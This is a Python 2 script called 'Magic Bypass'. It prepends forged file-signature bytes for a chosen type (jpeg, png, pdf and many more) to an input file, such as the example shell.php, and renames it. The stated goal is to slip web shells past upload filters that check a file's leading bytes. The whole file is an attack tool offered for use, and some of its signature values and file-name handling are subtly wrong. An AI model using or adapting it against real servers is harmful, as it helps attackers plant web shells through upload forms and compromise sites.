#!/usr/bin/env python2.7
import binascii
import os
import sys
import time



print('''
  __  __           _      ___                       
 |  \/  |__ _ __ _(_)__  | _ )_  _ _ __  __ _ ______
 | |\/| / _` / _` | / _| | _ \ || | '_ \/ _` (_-<_-<
 |_|  |_\__,_\__, |_\__| |___/\_, | .__/\__,_/__/__/
             |___/            |__/|_|               
''')


usage = "Usage: python magic_bytes.py <file> <extention>"
info = "For more info use - python magic_bytes.py help"+ "\n"
example = "Example: python magic_bytes.py shell.php jpeg"

arg_len = len(sys.argv)
if arg_len == 1:
	
	print(usage)
	print(example)
	print(info)
	sys.exit(1)



if arg_len == 2:
	input_file = sys.argv[1]
	if input_file == "help":
		print(usage)
		print(example)

		print('''
Extentions supported: \n
image: jpeg,png,gif,tiff \n
compression: rar,zip,7z,tar \n
video: mpg,mpeg \n
audio: mp3,midi \n
documents: ppt,doc,xls,msg \n
database: sqlitedb \n
other: xml,pdf,utf-8,ps,crx,dmg,dat,cab,wasm,swf,deb,pcap,rpm \n
Linux web servers detect file types by the first few bytes(magic bytes). \n

By injecting false magic bytes into the file, this filtering mechanism will be bypassed.
Sometimes they will also check if the file extension they are looking for is also in the file name 
, so that will also be but in for good measure. \n

Other filtering mechanisms may be in place, therefore the bypass will be unsuccessful. \n

This Script should NOT be used by people who use shoe laces!
Beach lovers only - I love shells xxx
			''')

	else:
		print(info)
	
	sys.exit(1)

input_file = sys.argv[1]


print(usage)
print(info)
time.sleep(2)

if arg_len == 2:
	print(info)
try:
	extention = sys.argv[2]

	#works
	if extention == "jpeg":
		bitlist  = ['00', '00', '00', '0C', '6A', '50', '20', '20', '0D', '0A']

	#not working
	elif extention == "xml":
		print('xml in use')
		#bitlist = ['00', '00', '89', '50', '4e', '47', '0d', '0a']
		bitlist = ['3c', '3f', '78', '6d', '6c', '20']
	
	elif extention == "png":
		bitlist = ['89', '50', '4e', '47', '0d', '0a', '1a', '0a', '00', '00', '00', '0d', '49', '48', '44', '52']


	elif extention == "zip":
		bitlist = ['50', '4B', '05', '06']

	elif extention == "tiff":
		bitlist = ['49', '49', '2A', '00', '10', '00', '00', '00']


	elif extention == "gif":
		bitlist = ['47', '49', '46', '38', '37', '61']


	elif extention == "tar":
		bitlist = ['1F', '9D']

	elif extention == "rpm":
		bitlist = ['ed', 'ab', 'ee', 'db']
	
	elif extention == "rar":
		bitlist = ['52', '61', '72', '21', '1A', '07', '00']

	elif extention == "utf-8":
		bitlist = ['EF', 'BB', 'BF']

	elif extention == "ps":
		bitlist = ['25', '21', '50', '53']

	elif extention == "mp3":
		bitlist = ['FF', 'FB']

	elif extention == "midi":
		bitlist = ['4D', '54', '68', '64']

	elif extention == "ppt":
		bitlist = ['D0', 'CF', '11', 'E0', 'A1', 'B1', '1A', 'E1']
	elif extention == "xls":
		bitlist = ['D0', 'CF', '11', 'E0', 'A1', 'B1', '1A', 'E1']
	elif extention == "doc":
		bitlist = ['D0', 'CF', '11', 'E0', 'A1', 'B1', '1A', 'E1']
	elif extention == "msg":
		bitlist = ['D0', 'CF', '11', 'E0', 'A1', 'B1', '1A', 'E1']

	elif extention == "crx":
		bitlist = ['43', '72', '32', '34']

	elif extention == "dmg":
		bitlist = ['78', '01', '73', '0D', '62', '62', '60']

	elif extention == "dat":
		bitlist = ['50', '4D', '4F', '43', '43', '4D', '4F', '43']

	elif extention == "7z":
		bitlist = ['37', '7A', 'BC', 'AF', '27', '1C']

	elif extention == "cab":
		bitlist = ['4D', '53', '43', '46']

	elif extention == "wasm":
		bitlist = ['00', '61', '73', '6d']

	elif extention == "swf":
		bitlist = ['46', '57', '53']

	elif extention == "deb":
		bitlist = ['21', '3C', '61', '72', '63', '68', '3E']

	elif extention == "mpg":
		bitlist = ['00', '00', '01', 'BA']

	elif extention == "mpeg":
		bitlist = ['00', '00', '01', 'B3']

	elif extention == "pcap":
		bitlist = ['a1', 'b2', 'c3', 'd4']

	elif extention == "pdf":
		bitlist = ['25', '50', '44', '46', '2d', '31', '2e', '34']

	elif extention == "sqlitedb":
		bitlist = ['53', '51', '4c', '69', '74', '65', '20', '66', '6f', '72', '6d', '61', '74', '20', '33', '00']
	
	else:
		print('Extention not recongnised!')
		print(info)
		sys.exit(1)


#split the name and extension so the name still has the required .ext in it
	input_file_split1 = input_file[0:-4]
	input_file_split2 = input_file[-4:]

#read in origianl shell file and right it out with the needed magic bytes
	with open("magic_"+ input_file_split1  + "." + extention+input_file_split2 , "a") as magicFile:
		with open(input_file,'rb') as inFile:
			content = inFile.read()
			hex_version = binascii.hexlify(content)
			#print(hex_version)
			print("Fake "+str(extention)+' file has been created :) Enjoy!')
			bytes = binascii.a2b_hex(''.join(bitlist))
			magicFile.write(bytes)
			magicFile.write(content)


except: 
	sys.exit(1)

